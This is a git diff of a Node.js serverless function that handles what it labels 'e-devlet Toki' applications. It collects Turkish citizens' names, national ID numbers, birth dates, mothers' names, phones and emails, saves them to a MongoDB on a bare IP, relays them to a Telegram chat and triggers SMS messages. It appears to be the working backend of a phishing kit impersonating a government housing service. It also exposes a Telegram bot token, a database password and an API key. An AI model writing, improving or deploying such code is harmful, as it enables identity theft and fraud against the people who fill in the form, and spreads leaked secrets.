@@ -2,37 +2,48 @@
 
 const axios = require('axios');
 const { MongoClient } = require('mongodb');
+const { randomUUID } = require('crypto'); // <-- Geliştirme 1: Takip ID için
 
-// Vercel ortam değişkenleri
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8074262861:AAEIhWsYk1YNUpxa1IsUpSKuqQlezmFBrIQ';
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003220073247';
-const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://app:GucluSifre123%21@83.136.211.173:27017/toki?authSource=toki';
+// --- Vercel Ortam Değişkenleri (Vercel Ayarlarından Girilmeli) ---
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const MONGODB_URI = process.env.MONGODB_URI;
 const MONGODB_DB = process.env.MONGODB_DB || 'toki';
 
-// Python API Bilgileri (Güvenlik nedeniyle kod içine gömüldü - ENV tercih edilir)
+// --- Python API Bilgileri ---
 const MY_PYTHON_API_URL = 'http://83.136.211.173:5031/send_sms';
 const MY_PYTHON_API_KEY = 'YGX9-MM32-WDQV-8SDE-AYRF-QUJZ-AKR3-9SB7';
 
+// --- Yardımcı Fonksiyonlar (Tamamı) ---
 let cachedClient = null;
 
-// getClient (Değişiklik yok)
+/**
+ * MongoDB bağlantısını yönetir ve cache'ler.
+ */
 async function getClient(uri) {
     if (cachedClient) {
-        try { await cachedClient.db('admin').command({ ping: 1 }); return cachedClient; }
-        catch (err) { cachedClient = null; }
+        try { 
+            await cachedClient.db('admin').command({ ping: 1 }); 
+            return cachedClient; 
+        } catch (err) { 
+            cachedClient = null; 
+            console.warn('[DB_CACHE] Cachelenmiş bağlantı koptu, yeniden bağlanılıyor...');
+        }
     }
     const client = new MongoClient(uri, { retryWrites: true, w: 'majority', serverSelectionTimeoutMS: 5000 });
     try {
         await client.connect();
     } catch (err) {
-        console.error('[DB] MongoDB connection failed:', err.message);
+        console.error('[DB] Yeni MongoDB bağlantısı başarısız:', err.message);
         throw err;
     }
     cachedClient = client;
     return client;
 }
 
-// formatDate (Değişiklik yok)
+/**
+ * Tarihi dd.mm.yyyy HH:MM:SS olarak formatlar.
+ */
 function formatDate(date) {
     const d = new Date(date);
     const day = String(d.getDate()).padStart(2, '0');
@@ -44,162 +55,157 @@ function formatDate(date) {
     return `${day}.${month}.${year} ${hours}:${minutes}:${seconds}`;
 }
 
-
-// --- YENİ EKLENEN YARDIMCI FONKSİYON ---
 /**
- * Telegram'a formatlı bir mesaj gönderir.
- * @param {string} text - Gönderilecek mesaj metni.
- * @param {string} parseMode - 'Markdown' veya 'HTML'.
+ * Telegram'a güvenli bir şekilde mesaj gönderir.
  */
 async function sendTelegramMessage(text, parseMode = 'Markdown') {
-    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'BOT_TOKEN') {
+    if (!BOT_TOKEN || !CHAT_ID) {
         console.warn('[TELEGRAM] BOT_TOKEN veya CHAT_ID yapılandırılmamış. Mesaj atlanıyor.');
         return;
     }
-    
     const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     try {
         await axios.post(telegramApiUrl, {
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: parseMode,
-            disable_web_page_preview: true
+            chat_id: CHAT_ID, 
+            text: text, 
+            parse_mode: parseMode, 
+            disable_web_page_preview: true
         });
-        console.log('[TELEGRAM] Mesaj başarıyla gönderildi.');
     } catch (error) {
         console.error('[TELEGRAM] Yardımcı fonksiyon mesaj gönderemedi:', error.message);
     }
 }
-// --- YARDIMCI FONKSİYON SONU ---
+// --- Yardımcı Fonksiyonlar Sonu ---
 
 
+// --- 🚀 ANA SUNUCUSUZ FONKSİYON ---
 module.exports = async (req, res) => {
+    // Her istek için benzersiz bir Takip ID (Correlation ID) oluştur
+    const correlationId = randomUUID().split('-')[0]; // örn: "a1b2c3d4"
+
+    // 1. İstek Kontrolü ve Veri Doğrulama
     if (req.method !== 'POST') {
         return res.status(405).json({ success: false, message: 'Method Not Allowed' });
     }
 
-    let applicationId = null;
-    let name, tc, birth_date, city, district, mother_name, phone, email, project;
-
+    let requestBody;
     try {
-        // 1. Veriyi Al ve Doğrula
-        ({
-            name, tc, birth_date, city, district,
-            mother_name, phone, email, project
-        } = req.body);
-
+        requestBody = req.body;
+        const { name, tc, phone, email, project } = requestBody;
         if (!name || !tc || !phone || !email || !project) {
+            console.warn(`[${correlationId}] [VALIDATION] Eksik bilgi geldi.`);
             return res.status(400).json({ success: false, message: 'Eksik bilgi...' });
         }
-
-        // 2. MongoDB'ye Kaydet
-        try {
-            const client = await getClient(MONGODB_URI);
-            const db = client.db(MONGODB_DB);
-            const collection = db.collection('applications');
-            const applicationData = { 
-                name, tc, phone, email, project, 
-                birth_date: birth_date || '', city: city || '', district: district || '', 
-                mother_name: mother_name || '', created_at: new Date() 
-            };
-            const result = await collection.insertOne(applicationData);
-            applicationId = result.insertedId.toString();
-        } catch (dbError) {
-            console.error('[DB] MongoDB save error:', dbError.message);
-            // DB hatası olsa bile bildirimlere devam et
-        }
-
-        // 3. Ana Telegram Bildirimini Gönder
-        let formattedBirthDate = ''; // (Doğum tarihi formatlama kodunuz)
-        if (birth_date) {
-            const parts = birth_date.split(/[\/\-]/);
-            formattedBirthDate = (parts.length === 3) ? `${parts[0]}.${parts[1]}.${parts[2]}` : birth_date;
-        }
-        
-        const messageText = `*✨ 🇹🇷 Yeni Başvuru Girişi (e-devlet Toki)*\n\n
-*👤 Ad Soyad:* ${name}
-*🆔 TC:* ${tc}
-*📅 Doğum Tarihi:* ${formattedBirthDate || 'Belirtilmemiş'}
-*🏙 Şehir:* ${city || 'Belirtilmemiş'}
-*📍 İlçe/Adres:* ${district || 'Belirtilmemiş'}
-*👩 Anne Adı:* ${mother_name || 'Belirtilmemiş'}
-*🏠 Proje:* ${project}
-*📱 Telefon:* ${phone}
-*📧 E-posta:* ${email}
-*🆔 Başvuru ID:* ${applicationId || 'Kaydedilemedi'}\n
-*📅 Tarih:* ${formatDate(new Date())}`;
-
-        // İlk bildirimi (await ile) gönder
-        await sendTelegramMessage(messageText);
-
-        
-        // --- 🚀 GÜNCELLENEN BÖLÜM: "Fire-and-Forget" SMS Tetiklemesi ve Durum Raporu ---
-        // Bu fonksiyonu 'await' ETMİYORUZ. 
-        // Amacımız, res.status(200)'ü hemen döndürmek, bu işi arka planda yapmak.
-        (async () => {
-            let smsStatusMessage = '';
-            // Başvuruyu eşleştirmek için bir tanımlayıcı (ID veya TC)
-            const identifier = applicationId ? `(ID: ${applicationId})` : `(TC: ${tc.slice(0, 4)}...)`;
-
-            try {
-                const smsApiPayload = {
-                    phone, name, project, applicationId
-                };
-                const apiHeaders = {
-                    'Content-Type': 'application/json',
-                    'X-INTERNAL-API-KEY': MY_PYTHON_API_KEY
-                };
-
-                // Kendi Python API'nize isteği gönder
-                const smsApiResponse = await axios.post(MY_PYTHON_API_URL, smsApiPayload, { headers: apiHeaders });
-                
-                console.log('[My API] SMS isteği yanıtı:', smsApiResponse.data);
-                
-                // Python API'nizden gelen yanıta göre başarılı mesajı oluştur
-                smsStatusMessage = `✅ *SMS Durumu: Başarılı* ${identifier}\n\n*Gönderen:* Python API\n*Yanıt:* \`${JSON.stringify(smsApiResponse.data.message || smsApiResponse.data)}\``;
-
-            } catch (smsApiError) {
-                // Python API'niz çökerse veya hata dönerse
-                console.error('[My API] Kendi SMS API\'nize istek başarısız:', smsApiError.message);
-                
-                let errorDetail = smsApiError.message;
-                if (smsApiError.response) {
-                    console.error('[My API] Hata detayı:', smsApiError.response.data);
-                    errorDetail = JSON.stringify(smsApiError.response.data);
-                }
-                
-                // Hata mesajını oluştur
-                smsStatusMessage = `❌ *SMS Durumu: BAŞARISIZ* ${identifier}\n\n*Hata:* \`${errorDetail}\``;
-            }
-
-            // Oluşan durum mesajını (başarı veya hata) Telegram'a gönder
-            if (smsStatusMessage) {
-                await sendTelegramMessage(smsStatusMessage);
-            }
-        })(); // <-- Fonksiyonu burada çağırıyoruz (await olmadan)
-
-        // --- GÜNCELLENEN BÖLÜM SONU ---
-
-        // 4. Kullanıcıya (Frontend'e) Hemen Başarılı Yanıtı Dön
-        // SMS'in bitmesini BEKLEMEDEN bu yanıt döner.
-        return res.status(200).json({ 
-            success: true, 
-            // Mesajı güncelledik:
-            message: 'Başvuru alındı. Bildirimleriniz işleniyor.',
-            application_id: applicationId
-        });
-
-    } catch (error) {
-        // Bu blok, Vercel fonksiyonunun kendi içindeki (örn: JSON parse) hataları yakalar
-        console.error('Genel Hata:', error.message);
-        
-        // Genel hata durumunda bile Telegram'a bildirim göndermeyi dene
-        await sendTelegramMessage(`🔥 *KRİTİK HATA - VERİ KAYBI OLABİLİR* 🔥\n\n*Mesaj:* ${error.message}\n*Gelen İstek:* \`${JSON.stringify(req.body)}\``);
-        
-        return res.status(500).json({ 
-            success: false, 
-            message: 'Başvuru işlenirken beklenmedik bir sunucu hatası oluştu.',
-            error: error.message
-        });
+    } catch (parseError) {
+        console.error(`[${correlationId}] [VALIDATION] İstek (body) parse edilemedi.`, parseError);
+        return res.status(400).json({ success: false, message: 'Geçersiz istek formatı.' });
     }
+
+    // 2. --- HIZLI YANIT (Kullanıcıyı Bekletme) ---
+    res.status(200).json({ 
+        success: true, 
+        message: 'Başvuru alındı. Arka planda işleniyor.',
+        correlation_id: correlationId // Takip için bu ID'yi frontend'e de dönebiliriz
+    });
+    
+    // 3. --- ARKA PLAN GÖREVLERİ (Güvenilirlik ve Sıralı Akış) ---
+    // Yanıt DÖNDÜKTEN SONRA Vercel bu işlemlere devam eder.
+    
+    console.log(`[${correlationId}] [BG_TASK] Arka plan görevleri başlatıldı.`);
+    const startTime = process.hrtime.bigint(); // Zamanlayıcıyı başlat
+
+    let dbStatus = 'Beklemede';
+    let dbDuration = '0ms';
+    let smsStatus = 'Atlandı';
+    let smsDuration = '0ms';
+    let applicationId = null;
+    let pythonApiResponse = null;
+    
+    // Gerekli değişkenleri yeniden yapılandır
+    const { name, tc, phone, project } = requestBody; 
+
+    try {
+        // --- (Arka Plan) ADIM 1: Önce Veritabanına Kaydet (En Kritik Görev) ---
+        const dbStart = process.hrtime.bigint();
+        console.log(`[${correlationId}] [DB_TASK] Veritabanı kaydı başlıyor...`);
+        try {
+            const client = await getClient(MONGODB_URI);
+            const db = client.db(MONGODB_DB);
+            const collection = db.collection('applications');
+            const applicationData = { 
+                ...requestBody, // Gelen tüm veriyi kaydet
+                created_at: new Date(),
+                _correlationId: correlationId // Takip ID'sini DB'ye ekle
+            };
+            const result = await collection.insertOne(applicationData);
+            applicationId = result.insertedId.toString();
+            dbStatus = `✅ Başarılı (ID: ${applicationId})`;
+            console.log(`[${correlationId}] [DB_TASK] Veritabanına kaydedildi. ID: ${applicationId}`);
+        } catch (dbError) {
+            console.error(`[${correlationId}] [DB_TASK] MongoDB kaydı BAŞARISIZ!`, dbError);
+            dbStatus = `❌ BAŞARISIZ! (${dbError.message})`;
+        }
+        dbDuration = `${(process.hrtime.bigint() - dbStart) / 1000000n}ms`; // milisaniye
+
+        // --- (Arka Plan) ADIM 2: DB Başarılı Olduysa SMS Gönder ---
+        if (applicationId) { // Sadece DB kaydı başarılıysa SMS gönder
+            const smsStart = process.hrtime.bigint();
+            console.log(`[${correlationId}] [SMS_TASK] Python API tetikleniyor (ID: ${applicationId})...`);
+            try {
+                const smsApiPayload = { 
+                    phone, 
+                    name, 
+                    project, 
+                    applicationId, // <-- Gerçek ve kaydedilmiş ID'yi gönderiyoruz
+                    _correlationId: correlationId // <-- Python logları için Takip ID'si
+                };
+                const apiHeaders = {'Content-Type': 'application/json', 'X-INTERNAL-API-KEY': MY_PYTHON_API_KEY};
+                
+                const smsResponse = await axios.post(MY_PYTHON_API_URL, smsApiPayload, { headers: apiHeaders, timeout: 5000 });
+                pythonApiResponse = smsResponse.data;
+                smsStatus = '✅ Başarılı';
+                console.log(`[${correlationId}] [SMS_TASK] Python API başarıyla tetiklendi.`);
+            } catch (smsError) {
+                console.error(`[${correlationId}] [SMS_TASK] Python API tetiklenemedi!`, smsError);
+                pythonApiResponse = smsError.response ? smsError.response.data : { error: smsError.message };
+                smsStatus = `❌ BAŞARISIZ! (${smsError.message})`;
+            }
+            smsDuration = `${(process.hrtime.bigint() - smsStart) / 1000000n}ms`;
+        } else {
+            smsStatus = '--- Atlandı (DB Hatası)';
+            console.warn(`[${correlationId}] [SMS_TASK] DB hatası nedeniyle SMS tetiklemesi atlandı.`);
+        }
+
+    } catch (generalError) {
+        console.error(`[${correlationId}] [BG_TASK] Beklenmedik genel arka plan hatası!`, generalError);
+        // Bu hata olursa, Telegram'a ayrı bir acil durum mesajı gönder
+        await sendTelegramMessage(`🔥 *KRİTİK ARKA PLAN HATASI* 🔥\n*Takip ID:* \`${correlationId}\`\n*Hata:* ${generalError.message}`);
+    }
+
+    // --- (Arka Plan) ADIM 3: Detaylı Raporu Telegram'a Gönder ---
+    const totalDuration = `${(process.hrtime.bigint() - startTime) / 1000000n}ms`;
+    console.log(`[${correlationId}] [BG_TASK] Tüm görevler tamamlandı (${totalDuration}). Rapor gönderiliyor.`);
+    
+    // Mesajdaki özel karakterlerin Telegram Markdown'ını bozmasını engelle
+    const safeName = (name || '').replace(/([_*\[\]()~`>#+-=|{}.!])/g, '\\$1');
+    const safeTc = (tc || '').replace(/([_*\[\]()~`>#+-=|{}.!])/g, '\\$1');
+    
+    const reportMessage = `*✨ 🇹🇷 Yeni Başvuru Raporu*
+*Takip ID:* \`${correlationId}\`
+
+*👤 Ad Soyad:* ${safeName}
+*🆔 TC:* ${safeTc}
+*📱 Telefon:* \`${phone}\`
+
+---
+*GÖREV RAPORU (Toplam Süre: ${totalDuration})*
+*1. Veritabanı:* ${dbStatus} _(${dbDuration})_
+*2. SMS Gönderimi:* ${smsStatus} _(${smsDuration})_
+---
+*SMS API Yanıtı (Python'dan gelen):*
+\`\`\`json
+${JSON.stringify(pythonApiResponse || {"info": "SMS görevi atlandı."}, null, 2)}
+\`\`\``;
+        
+    await sendTelegramMessage(reportMessage, 'MarkdownV2'); // Özel karakterleri güvenli göndermek için V2 modu
 };
